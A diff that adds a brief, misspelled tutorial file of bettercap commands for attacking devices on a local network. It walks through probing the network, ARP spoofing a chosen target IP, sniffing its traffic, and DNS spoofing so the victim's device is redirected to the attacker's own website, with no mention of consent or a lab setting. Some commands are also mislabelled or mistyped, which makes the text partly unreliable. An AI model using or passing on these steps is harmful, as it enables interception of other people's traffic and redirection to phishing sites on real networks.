@@ -1,0 +1,10 @@
+First Type bettercap
+then type net.probe on
+then type net.show
+then type // set arp.spoof.targets (Enter Your target ip)
+then start spoofing type (arp.spoof on)
+then type// net.sniff on
+spoofing off command // net.sniff off
+now redirect to devvice to my website
+type // set.spoof.domains (website name main website)
+then redirect to website where you want device redirect type // set dns.spoof.address (type here your webiste ip you create)  impo massgage typw your website name or ip adress without () brackets
